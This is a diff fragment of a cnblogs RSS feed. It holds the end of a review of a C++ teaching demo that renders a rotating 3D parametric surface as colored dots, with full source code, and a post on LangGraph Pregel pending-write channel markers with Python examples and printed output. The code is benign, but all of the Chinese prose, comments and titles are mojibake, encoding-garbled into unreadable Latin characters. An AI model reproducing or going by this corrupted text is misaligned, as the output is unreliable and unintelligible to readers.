-<p>ç¨åºæ²¡æä½¿ç¨çº¿æ¡ï¼Lineï¼æå¤è¾¹å½¢ï¼Polygonï¼å¡«åï¼èæ¯ä½¿ç¨äº dot(1) ç»å¶ç¹ãè¿ç§ç¹äºæ¸²æé£æ ¼ä¸ä»èçäºè®¡ç®éï¼ä¸éè¦å¤çé®æ¡ååæ åï¼ï¼èä¸äº§çäºä¸ç§å¤å¤çãç±»ä¼¼ç¤ºæ³¢å¨ææ©æç¢éæ¾ç¤ºå¨çç§ææã</p>
-<ul>
-<li>å¨æçè²ï¼</li>
-</ul>
-<p>pen.color(x+y) è¿è¡ä»£ç éå¸¸å·§å¦ãå®æ²¡æä½¿ç¨å¤æççº¹çæåç§æ¨¡åï¼èæ¯æ ¹æ®å±å¹åæ (x,y) çåæ¥æ å°é¢è²ã<br>
-ä¼ç¹ï¼è®¡ç®ææ¬æä½ï¼ä¸éçç©ä½æè½¬ï¼å±å¹åæ ååï¼é¢è²ä¹ä¼éä¹æµå¨ï¼äº§çäºä¸ç§å½©è¹è¬çæµåææï¼æå¤§å°å¢å¼ºäºè§è§å¸å¼åã<br>
-ç¼ºç¹ï¼é¢è²æ¯ç»å®å¨å±å¹ç©ºé´èéç©ä½è¡¨é¢çï¼æä»¥é¢è²ä¼éæè½¬âæ»å¨âï¼ä½è¿æ°æ°å½¢æäºä¸ç§ç¬ç¹çå¨æç¾æã</p>
-<ul>
-<li>éæ ·å¯åº¦ï¼</li>
-
-
-</ul>
-<p>u_steps å v_steps åè®¾ä¸º 250ï¼æå³çæ¯å¸§è¦è®¡ç®å¹¶ç»å¶&nbsp;250Ã250=62,500&nbsp;ä¸ªç¹ãå¨ C++ ä¸­è¿ä¸ªè®¡ç®éå®å¨å¯ä»¥æ¥åï¼è§é¢ä¸­ä¹ç¡®å®å±ç¤ºäºç»è»ä¸å¯éçæ²é¢ç»æã</p>
-<h2>3. æè²æä¹ä¸å·¥å·æ¨å¹¿</h2>
-<p>&nbsp;</p>
-<ul>
-<li>éä½ C++ å¾å½¢ç¼ç¨é¨æ§ï¼</li>
-
-
-</ul>
-<p>ä¼ ç»ç C++ å¾å½¢ç¼ç¨ï¼å¦ OpenGL/DirectXï¼éç½®ç¯å¢å¤æï¼API ç¹çãè§é¢ä¸æ¹çæå­è¯´ææå°äº âC++ ç²¾çµåºâ å DevC++ãè¿è¡¨æè¯¥ç¨åºæ¨å¨éè¿å°è£å¥½çç®æåºï¼è®©ä¸­å­¦çæç¼ç¨åå­¦èè½å¿«éçå°å¾å½¢åææï¼å¢å¼ºå­¦ä¹ ä¿¡å¿ã</p>
-<ul>
-<li>è·¨å­¦ç§èåï¼</li>
-
-
-</ul>
-<p>è¿ä¸ªæ¡ä¾å®ç¾èåäºæ°å­¦ï¼ä¸è§å½æ°ãåæ°æ¹ç¨ï¼ãç©çï¼ç©ºé´æè½¬ï¼åè®¡ç®æºç§å­¦ï¼å¾ªç¯ãç»æä½ãåæ æ å°ï¼ãå®æ¯ STEM æè²ä¸­éå¸¸å¥½çç´ æã</p>
-<h2>4. æ¹è¿å»ºè®®ä¸æè</h2>
-<p>è½ç¶ç¨åºè¿è¡ææå¾å¥½ï¼ä½å¦ææ³è¿ä¸æ­¥ä¼åææ·±å¥å­¦ä¹ ï¼å¯ä»¥èèä»¥ä¸æ¹åï¼</p>
-<ul>
-<li>æ·±åº¦ç¼å²ï¼Z-Bufferingï¼ï¼</li>
-
-
-</ul>
-<p>ç®åçç»å¶é¡ºåºæ¯åºå®çãå¦ææ²é¢èªèº«åçé®æ¡ï¼ä¾å¦æè½¬ 180 åº¦åï¼èé¢è·å°åé¢ï¼ï¼ç®åçé»è¾å¯è½ä¼æèé¢çç¹ç»å¨æ­£é¢çç¹ä¸é¢ï¼å¯¼è´è§è§ç©¿å¸®ãå¼å¥ Z ç¼å²å¯ä»¥è§£å³é®æ¡å³ç³»ã</p>
-<ul>
-<li>åç§æ¨¡åï¼</li>
-
-
-</ul>
-<p>ç®åçé¢è²ä»ä¾èµåæ ãå¦æå¼å¥æ³åéè®¡ç®åç®åçåç§ï¼å¦ Phong æ¨¡åï¼ï¼æ²é¢çç«ä½æä¼æ´å¼ºï¼è½æ´æ¸æ°å°çåºå¹å¸ç»æã</p>
-<ul>
-<li>äº¤äºæ§ï¼</li>
-
-
-</ul>
-<p>ç®ååªè½èªå¨æè½¬ãå¦æè½éè¿é¼ æ æå¨æ¹å rotate_angleï¼æèéè¿é®çæ¹ååæ°a çç³»æ°ï¼ç¨æ·å°±è½å®æ¶æ¢ç´¢ä¸ååæ°ä¸çæ²é¢å½¢æï¼äºå¨æ§ä¼å¤§å¤§å¢å¼ºã</p>
-<ul>
-<li>æ§è½ä¼åï¼</li>
-
-
-</ul>
-<p>è½ç¶ 6 ä¸ç¹ä¸å¤ï¼ä½å¦æè¦å¢å å¯åº¦ï¼å¯ä»¥èèåªç»å¶å¯è§é¢ï¼æèä½¿ç¨ GPU å éï¼Shaderï¼ï¼ä¸è¿å¯¹äºå­¦ä¹  CPU é»è¾æ¥è¯´ï¼å½åæ¹æ¡å·²ç»è¶³å¤å¥½ã</p>
-<h2>æ»ç»</h2>
-<p>è¿æ¯ä¸ä¸ªå¸åçâå°ä»£ç ï¼å¤§è§éâçä¼ç§ä½åã<br>
-å®è¯æäºä¸éè¦åºå¤§çæ¸¸æå¼æï¼ä»å­åºç¡ç C++ è¯­æ³åæ°å­¦ç¥è¯ï¼å°±è½åé åºä»¤äººæå¹çè§è§èºæ¯ãå¯¹äºè§é¢ä½èèè¨ï¼è¿ä¸ä»å±ç¤ºäºç¼ç¨è½åï¼æ´å±ç¤ºäºå¯¹æ°å­¦ä¹ç¾ççè§£ãå¯¹äºè§ä¼èè¨ï¼è¿æ¯ä¸ä¸ªæä½³ç C++ å¾å½¢åå¥é¨å¯èï¼è½æ¿åå¾å¤äººå¯¹âä»£ç å¦ä½åé ä¸çâçå¥½å¥å¿ã</p>
-<p>è¯åï¼âââââ&nbsp; (ä½ä¸ºæå­¦æ¼ç¤ºåæ°å­¦å¯è§åæ¡ä¾)</p>
-<div class="cnblogs_code">
-<pre>#include <span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">sprites.h</span><span style="color: rgba(128, 0, 0, 1)">"</span>  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)">åå«C++ç²¾çµåº</span>
-#include &lt;cmath&gt;      <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æ°å­¦åºï¼sin/cos/Ïç­ï¼</span>
-#include &lt;vector&gt;     <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å­å¨é¡¶ç¹åæ </span>
-<span style="color: rgba(0, 0, 0, 1)">
-Screen screen;
-Sprite pen{</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">blank</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(0, 0, 0, 1)">};  
-
-</span><span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">double</span> PI = M_PI;    <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> å®ä¹å¸¸é</span>
-<span style="color: rgba(0, 0, 255, 1)">double</span> rotate_angle = <span style="color: rgba(128, 0, 128, 1)">0.0</span>;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æè½¬è§åº¦å¢éï¼æ§å¶å¨ç»éåº¦ï¼</span>
-<span style="color: rgba(0, 0, 255, 1)">struct</span> Point3D {    <span style="color: rgba(0, 0, 255, 1)">double</span> x, y, z;};  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 3Dç¹ç»æä½
-
-</span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> 3Dç¹ç»Yè½´æè½¬ï¼å®ç°å¨ææè½¬ææï¼</span>
-Point3D rotateY(Point3D p, <span style="color: rgba(0, 0, 255, 1)">double</span><span style="color: rgba(0, 0, 0, 1)"> angle) {
-    </span><span style="color: rgba(0, 0, 255, 1)">double</span> cos_a =<span style="color: rgba(0, 0, 0, 1)"> cos(angle);
-    </span><span style="color: rgba(0, 0, 255, 1)">double</span> sin_a =<span style="color: rgba(0, 0, 0, 1)"> sin(angle);
-    </span><span style="color: rgba(0, 0, 255, 1)">return</span><span style="color: rgba(0, 0, 0, 1)"> {
-        p.x </span>* cos_a - p.z *<span style="color: rgba(0, 0, 0, 1)"> sin_a,
-        p.y,
-        p.x </span>* sin_a + p.z *<span style="color: rgba(0, 0, 0, 1)"> cos_a
-    };
-}
-
-</span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éè§æå½±ï¼3Dè½¬2Dï¼ç®åçï¼å¢å¼ºZè½´æ·±åº¦æï¼</span>
-<span style="color: rgba(0, 0, 255, 1)">void</span> project(Point3D p, <span style="color: rgba(0, 0, 255, 1)">int</span>&amp; screen_x, <span style="color: rgba(0, 0, 255, 1)">int</span>&amp; screen_y, <span style="color: rgba(0, 0, 255, 1)">double</span> scale = <span style="color: rgba(128, 0, 128, 1)">100.0</span><span style="color: rgba(0, 0, 0, 1)">) {
-    </span><span style="color: rgba(0, 0, 255, 1)">double</span> factor = scale / (<span style="color: rgba(128, 0, 128, 1)">2.0</span> + p.z);  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éè§å å­ï¼Zè¶å¤§ï¼æå½±è¶å°ï¼</span>
-    screen_x = static_cast&lt;<span style="color: rgba(0, 0, 255, 1)">int</span>&gt;(p.x *<span style="color: rgba(0, 0, 0, 1)"> factor);
-    screen_y </span>= static_cast&lt;<span style="color: rgba(0, 0, 255, 1)">int</span>&gt;(p.y *<span style="color: rgba(0, 0, 0, 1)"> factor);
-}
-
-</span><span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)"> main() {        
-    screen.title(</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">ä½èï¼æå´ç</span><span style="color: rgba(128, 0, 0, 1)">"</span>).bgcolor(<span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">black</span><span style="color: rgba(128, 0, 0, 1)">"</span>).tracer(<span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">);
-    pen.hide().pu();
-    
-     </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éååæ°uåvï¼è®¡ç®å¹¶ç»å¶ææç¹</span>
-    <span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">int</span> u_steps = <span style="color: rgba(128, 0, 128, 1)">250</span>;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> uæ¹åéæ ·æ°ï¼è¶å¤è¶ç²¾ç»ï¼</span>
-    <span style="color: rgba(0, 0, 255, 1)">const</span> <span style="color: rgba(0, 0, 255, 1)">int</span> v_steps =<span style="color: rgba(128, 0, 128, 1)">250</span>;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> væ¹åéæ ·æ°</span>
-    <span style="color: rgba(0, 0, 255, 1)">double</span> u_inc = <span style="color: rgba(128, 0, 128, 1)">2</span> * PI /<span style="color: rgba(0, 0, 0, 1)"> u_steps;
-    </span><span style="color: rgba(0, 0, 255, 1)">double</span> v_inc = <span style="color: rgba(128, 0, 128, 1)">2</span> * PI / v_steps;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> vèå´-Ï~Ïï¼æ»è·¨åº¦2Ï</span>
-   
-    <span style="color: rgba(0, 0, 255, 1)">while</span><span style="color: rgba(0, 0, 0, 1)"> (screen.exitonclick() ) {        
-        screen.clear();   </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æ¸ç©ºå±å¹ï¼æ¯ä¸å¸§éæ°ç»å¶ï¼           </span>
-        
-        <span style="color: rgba(0, 0, 255, 1)">for</span> (<span style="color: rgba(0, 0, 255, 1)">int</span> i = <span style="color: rgba(128, 0, 128, 1)">0</span>; i &lt;= u_steps; ++<span style="color: rgba(0, 0, 0, 1)">i) {
-            </span><span style="color: rgba(0, 0, 255, 1)">double</span> u = i *<span style="color: rgba(0, 0, 0, 1)"> u_inc;
-            </span><span style="color: rgba(0, 0, 255, 1)">double</span> a = u;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> a = uï¼å¬å¼è¦æ±ï¼</span>
-            <span style="color: rgba(0, 0, 255, 1)">for</span> (<span style="color: rgba(0, 0, 255, 1)">int</span> j = <span style="color: rgba(128, 0, 128, 1)">0</span>; j &lt;= v_steps; ++<span style="color: rgba(0, 0, 0, 1)">j) {
-                </span><span style="color: rgba(0, 0, 255, 1)">double</span> v = -PI + j * v_inc;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> vä»-Ïå°Ï               </span>
-                Point3D p;   <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> è®¡ç®åå§3Dåæ ï¼èçæ²é¢å¬å¼ï¼</span>
-                p.x =a * cos(v) *<span style="color: rgba(0, 0, 0, 1)"> sin(u);
-                p.y </span>=a * cos(u) *<span style="color: rgba(0, 0, 0, 1)"> cos(v);
-                p.z </span>= -a *<span style="color: rgba(0, 0, 0, 1)"> sin(v);
-                </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ç»Yè½´æè½¬ï¼ä»èå®ç°å¨æ3Dææ</span>
-                p =<span style="color: rgba(0, 0, 0, 1)"> rotateY(p, rotate_angle);               
-                </span><span style="color: rgba(0, 0, 255, 1)">int</span><span style="color: rgba(0, 0, 0, 1)"> x, y;
-                project(p, x, y);   </span><span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> æå½±å°2Då±å¹åæ </span>
-                <span style="color: rgba(0, 0, 255, 1)">if</span>(x&gt;=<span style="color: rgba(128, 0, 128, 1)">400</span> || x&lt;=-<span style="color: rgba(128, 0, 128, 1)">400</span> || y&gt;=<span style="color: rgba(128, 0, 128, 1)">300</span> || y&lt;= -<span style="color: rgba(128, 0, 128, 1)">300</span>)<span style="color: rgba(0, 0, 255, 1)">continue</span><span style="color: rgba(0, 0, 0, 1)">; 
-                pen.color(x</span>+y).go(x, y).dot(<span style="color: rgba(128, 0, 128, 1)">1</span>);  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> ç»å¶å½åç¹     </span>
-<span style="color: rgba(0, 0, 0, 1)">            
-            }
-        }
-        screen.update();
-        rotate_angle </span>+= <span style="color: rgba(128, 0, 128, 1)">0.02</span><span style="color: rgba(0, 0, 0, 1)">;
-        </span><span style="color: rgba(0, 0, 255, 1)">if</span> (rotate_angle &gt; <span style="color: rgba(128, 0, 128, 1)">2</span> * PI) rotate_angle -= <span style="color: rgba(128, 0, 128, 1)">2</span> * PI;  <span style="color: rgba(0, 128, 0, 1)">//</span><span style="color: rgba(0, 128, 0, 1)"> éç½®è§åº¦ï¼é¿åæº¢åº        </span>
-<span style="color: rgba(0, 0, 0, 1)">    }
-    
-    </span><span style="color: rgba(0, 0, 255, 1)">return</span> <span style="color: rgba(128, 0, 128, 1)">0</span><span style="color: rgba(0, 0, 0, 1)">;    
-}</span></pre>
-</div>
-<p>&nbsp;</p>
-
-<span data-cke-copybin-start="1">
-<span data-cke-copybin-end="1">â</span></span>
-
-</div>
-<div class="clear"></div>
-
-	<div class="postDesc">posted on 
-<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-20 16:44">2026-02-20 16:43</span>&nbsp;
-<a href="https://www.cnblogs.com/lixingqiu">æå´ç</a>&nbsp;
-éè¯»(<span id="post_view_count">21</span>)&nbsp;
-è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
-&nbsp;
-<a href="javascript:void(0)" onclick="AddToWz(19626608);return false;">æ¶è</a>&nbsp;
-<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626608', targetLink: 'https://www.cnblogs.com/lixingqiu/p/19626608', title: 'å°ä»£ç ï¼å¤§è§éï¼è¯ä¸ä¸ªå¸åçâæ°å­¦å¯è§å + è®¡ç®æºå¾å½¢å­¦å¥é¨âçä¼ç§æ¡ä¾(C++ç²¾çµåº3Dæ¡ä¾)' })">ä¸¾æ¥</a>
-</div>
- ]]>
     </description>
     </item>
 <item>
@@ -1358,157 +885,6 @@ h_j(\mathbf{X})=0,\hspace{2em} j=1,2,\cdots,m
 &nbsp;
 <a href="javascript:void(0)" onclick="AddToWz(19626486);return false;">æ¶è</a>&nbsp;
 <a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626486', targetLink: 'https://www.cnblogs.com/GeophysicsWorker/p/19626486', title: 'å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼å­ï¼ï¼å¸éãå¸å½æ°ä¸å¸è§å' })">ä¸¾æ¥</a>
-</div>
-         ]]>
-    </description>
-    </item>
-<item>
-    <title><![CDATA[ [æè§£LangChainæ§è¡å¼æ]éå¸¸è§Pending Writeçæä¹å ]]></title>
-    <link>https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes</link>
-    <guid>fc98387085725e992681708a6e1dd471</guid>
-    <description>
-    <![CDATA[ 
-            <h1 class="postTitle">
-                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/jaydenai/p/19625923/non-regular-pending-writes" title="åå¸äº 2026-02-20 09:11">
-    <span role="heading" aria-level="2">[æè§£LangChainæ§è¡å¼æ]éå¸¸è§Pending Writeçæä¹å</span>
-    
-
-</a>
-
-            </h1>
-            <div class="clear"></div>
-            <div class="postBody">
-                    <div id="cnblogs_post_description" style="display: none">
-        
-        PendingWriteä¸åç»çç¬¬äºé¨åè¡¨ç¤ºåå¥çChannelï¼ä½æ¯å¯¹äºä¸äºç¹æ®çåºæ¯ï¼æ¯å¦åºéãæ åå¥ãä¸­æ­åæ¢å¤ï¼å®ä»¬çå¼ä¸åæ¯ä¸ä¸ªæ®éçChannelåç§°
-    </div>
-<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<p>PendingWriteä¸åç»çç¬¬äºé¨åè¡¨ç¤ºåå¥çChannelï¼ä½æ¯å¯¹äºä¸äºç¹æ®çåºæ¯ï¼æ¯å¦åºéãæ åå¥ãä¸­æ­åæ¢å¤ï¼å®ä»¬çå¼ä¸åæ¯ä¸ä¸ªæ®éçChannelåç§°ï¼èæ¯ä½¿ç¨å¦ä¸çå¼ï¼</p>
-<ul>
-<li><code>__error__</code>ï¼æ§è¡Nodeå¯¹åºçä»»å¡åºç°å¼å¸¸ï¼</li>
-<li><code>__no_writes__</code>ï¼Nodeä»»å¡æåæ§è¡ï¼ä½æ¯æ²¡ææ§è¡éå¯¹Channelçè¾åºï¼</li>
-<li><code>__interrupt__</code>ï¼ä»»å¡ä¸­æ­ï¼</li>
-<li><code>__resume__</code>ï¼è¡¨ç¤ºæ¢å¤æ§è¡æä¾çæ°æ®ï¼</li>
-</ul>
-<p>æ¥ä¸æ¥æä»¬ä¸¤ä¸ªä¾å­æ¥äº§çä¸è¿°è¿å ç§ç¹æ®çPending Writeãæä»¬åæ¥æ¨¡æåºéçåºæ¯ï¼å¦ä¸é¢çä»£ç çæ®µæç¤ºï¼æä»¬æ§è¡çPregelå¯¹è±¡å·æä¸ä¸ªå¯ä¸çNodeï¼å®çå¤çå½æ°ç´æ¥æåºä¸ä¸ªå¼å¸¸ã</p>
-<pre><code class="language-python">from langgraph.pregel import Pregel, NodeBuilder
-from langgraph.channels import LastValue
-from langgraph.checkpoint.memory import InMemorySaver
-from typing import Any
-
-def handle(args: dict[str, Any])-&gt;None:
-    raise Exception("manllually raised exception")
-
-node = NodeBuilder().subscribe_to("start").do(handle)
-app = Pregel(
-    nodes={"body": node},
-    channels={"start": LastValue(str)},
-    checkpointer=InMemorySaver(),
-    input_channels=["start"],
-    output_channels=[],
-)
-config = {"configurable": {"thread_id": "123"}}
-try:
-    result = app.invoke({"start": "begin"}, config=config)
-except Exception as ex:
-    print(f"Caught exception:{ex}" )
-
-(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
-print(pending_writes)
-</code></pre>
-<p>æä»¬å¨try/exceptåä¸­å®æéå¯¹Pregelçè°ç¨ï¼å¹¶ææåè¾åºå¾å°çå¼å¸¸ä¿¡æ¯ãæ¥ä¸æ¥æä»¬è°ç¨Checkpointerï¼ä¸ä¸ªInMemorySaverå¯¹è±¡ï¼ç<code>get_tuple</code>æ¹æ³å¾å°å¯¹åºç<code>CheckpointTuple</code>åç»ï¼ç¶åå°<code>pending_writes</code>é¨åè¾åºåºæ¥ãä»å¦ä¸æç¤ºçè¾åºç»æå¯ä»¥çåºï¼è¿ä¸ªPending Writeä¸åç»çChannelåç§°è¢«è®¾ç½®ä¸º <code>__error__</code> ï¼æ´ä¸ªExceptionå¯¹è±¡æä¸ºäºåå¥çåå®¹ã</p>
-<pre><code>Caught exception:manllually raised exception
-[('f9ff1e88-4d82-f417-ad11-8fd870bfe647', '__error__', "Exception('manllually raised exception')")]
-</code></pre>
-<p>ç±äºå¹¶ä¸æ¯ææçNodeé½æåChannelåå¥æ§è¡ç»æçéæ±ï¼æä»¥åªè¦å¤çå½æ°æåæ§è¡ï¼å³ä½¿æ²¡æChannelè¾åºçè¡ä¸ºï¼è¯¥ä»»å¡çç¶æä¹ä¼è¢«è§ä¸º<code>æå</code>ï¼Checkpointeråªæ¯éç¨ä¸åçå½¢å¼æ¥è®°å½è¿ç§ä¸éè¦åå¥çPending Writeãå¦ä¸çè¿ä¸ªç¨åºä¸ä»ä»æ¼ç¤ºäºè¿ç§<code>æ è¾åºåå¥</code>çåºæ¯ï¼è¿åæ¶æ¨¡æäºä¸­æ­åæ¢å¤ã</p>
-<pre><code class="language-python">from langgraph.pregel import Pregel, NodeBuilder
-from langgraph.channels import LastValue
-from langgraph.checkpoint.memory import InMemorySaver
-from typing import Any
-from langgraph.types import Command, interrupt
-
-def foo(args: dict[str, Any]) -&gt; list[str]:
-    resume1 = interrupt("1st interrupt")
-    assert resume1 == "1st resume"
-
-    resume2 = interrupt("2nd interrupt")
-    assert resume2 == "2nd resume"
-
-    resume3 = interrupt("3rd interrupt")
-    assert resume3 == "3rd resume"
-
-    return [resume1, resume2, resume3]
-
-def bar(args: dict[str, Any]) -&gt; None:
-    pass
-
-app = Pregel(
-    nodes={
-        "foo": NodeBuilder().subscribe_only("start").do(foo).write_to("output"),
-        "bar": NodeBuilder().subscribe_only("start").do(bar),
-    },
-    channels={
-        "start": LastValue(str),
-        "output": LastValue(list[str]),
-    },
-    input_channels=["start"],
-    output_channels=["output"],
-    checkpointer=InMemorySaver(),
-)
-
-config = {"configurable": {"thread_id": "123"}}
-result = app.invoke(input={"start": "begin"}, config=config, stream_mode="tasks")
-(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
-print(f"After invoke:\n{pending_writes}")
-
-app.invoke(input=Command(resume="1st resume"), config=config)
-(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
-print(f"\nAfter resume 1:\n{pending_writes}")
-
-app.invoke(input=Command(resume="2nd resume"), config=config)
-(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
-print(f"\nAfter resume 2:\n{pending_writes}")
-
-result = app.invoke(input=Command(resume="3rd resume"), config=config)
-assert result == {"output": ["1st resume", "2nd resume", "3rd resume"]}
-(_, _, _, _, pending_writes) = app.checkpointer.get_tuple(config)
-print(f"\nAfter resume 3:\n{pending_writes}")
-</code></pre>
-<p>å¦ä¸é¢çä»£ç çæ®µæç¤ºï¼æä»¬ä¸ºPregelæä¾äºä¸¤ä¸ªå¹¶è¡æ§è¡çèç¹fooåbarï¼å¶ä¸­barå¯¹åºçå½æ°å¹¶æªæ§è¡ä»»ä½æææä½ï¼ä¹æ²¡æä»»ä½çè¾åºãæä»¬ä¸ºèç¹fooå¯¹åºçå¤çå½æ°å¶é äºä¸æ¬¡äººä¸ºä¸­æ­ï¼æä»¥éè¦è³å°åæ¬¡è°ç¨æè½ç»æã</p>
-<p>æä»¬å¨åå»ºçRunnableConfigå¯¹è±¡ä¸­æä¾äºç»ä¸çThread IDï¼å¹¶å°å®ä½ä¸ºåç»­æ¹æ³è°ç¨çåæ°ãéå¯¹Pregelçä¸æ¬¡è°ç¨ï¼ç¬¬ä¸æ¬¡æ¯ä¸ºå¸¸è§è°ç¨ï¼åé¢ä¸¤æ¬¡åå«æ¯éå¯¹ä¸¤æ¬¡ä¸­æ­çæ¢å¤è°ç¨ãæä»¬å¨æ¯æ¬¡è°ç¨åï¼å¾å°å¹¶è¾åºCheckpointerè®°å½ä¸æ¥çPending Writeã</p>
-<p>ä»å¦ä¸çè¾åºç»æå¯ä»¥çåºï¼ç¬¬ä¸æ¬¡å¸¸è§è°ç¨åï¼ èç¹fooåå¨ç¬¬ä¸ä¸ªä¸­æ­å¤ï¼èç¹baræåæ§è¡ä½æ²¡æè¾åºï¼æä»¥Checkpointerå°å®ä»¬ä½ä¸ºPending Writeè®°å½ä¸æ¥ï¼Channelåç§°åå«æ¯<code>__interrupt__</code>å<code>__no_writes__</code>ï¼åèçåå¥åå®¹æ¯ä¸ä¸ª<code>Interrupt</code>å¯¹è±¡ï¼å®å·ææä»¬æå®çå¼â1st interruptâãæä»¬ä¹çå°äºInterruptå¯¹è±¡å·æä¸ä¸ªå¯ä¸æ è¯ï¼å¨æ¢å¤è°ç¨æ¶æä»¬å¯ä»¥å©ç¨æ­¤æ è¯ä¸ºå¶æå®éå¯¹æ§çæ¢å¤æ°æ®ï¼Command(resume={"id":"resume value")ï¼ã</p>
-<pre><code>After invoke:
-[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='1st interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None)]
-
-After resume 1:
-[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='2nd interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None), ('00000000-0000-0000-0000-000000000000', '__resume__', '1st resume'), ('8d407c25-02f6-9101-d1b8-5a99c247edde', '__resume__', ['1st resume'])]
-
-After resume 2:
-[('8d407c25-02f6-9101-d1b8-5a99c247edde', '__interrupt__', [Interrupt(value='3rd interrupt', id='5603cdf275d8b8ba0633d272fa176fd3')]), ('22507855-e257-1b5b-eb1a-3c3fb0a071e9', '__no_writes__', None), ('00000000-0000-0000-0000-000000000000', '__resume__', '2nd resume'), ('8d407c25-02f6-9101-d1b8-5a99c247edde', '__resume__', ['1st resume', '2nd resume'])]
-
-After resume 3:
-[]
-</code></pre>
-<p>éå¯¹ç¬¬ä¸ä¸ªä¸­æ­çæ¢å¤è°ç¨åï¼èç¹fooåå¨ç¬¬äºä¸ªä¸­æ­å¤ï¼æ­¤æ¶Checkpointerä¼åå»ºä¸¤ä¸ªæ°çPending Writeæä¹åæä»¬æä¾çResume Valueï¼â1st resumeâï¼ï¼å®çChannelåç§°å°±æ¯<code>__resume__</code>ï¼ä½ä¸ºä»ä¹æ¯ä¸¤ä¸ªå¢ï¼</p>
-<p>è¿å®éä¸åæ äº Pregel å¤ç<code>å¤é¨æä»¤æ³¨å¥</code>ä¸<code>Nodeåé¨æ¶è´¹</code>çåæ­¥æºå¶ãç¬¬ä¸ä¸ªè¢«ç§°ä¸ºå¨å±Resume Valueï¼Global Resume Valueï¼, å®ä»£è¡¨ä»å¤é¨ï¼éè¿Command(resume=...)ï¼æ³¨å¥å°å¾ä¸­çåå§æä»¤ãç±äºå®ä¸æ¯ç±å¾åNodeäº§ççï¼å æ­¤ Task ID ä¸ºç©ºï¼å®æ¯å¤éæ´ä¸ªæåç¶æçâæ»å¼å³âãç¬¬äºä¸ªèç¹fooå¯¹å¨å±Resume Valueçæ¶è´¹è®°å½ï¼æä»¥å·æä¸ä¸ªæç¡®çTaks IDãå½èç¹fooè¢«å¤éå¹¶æ§è¡å°interruptè¡æ¶ï¼å®ä¼ä»å¨å±Resume Valueè¯»åæ°æ®ãä¸ºäºä¿è¯å¹ç­æ§åå¯åæº¯æ§ï¼ç³»ç»ä¼å°<code>æ¿èµ°äºåªä¸ªResume Value</code>è®°å½å¨å®çä»»å¡è·¯å¾ä¸ã</p>
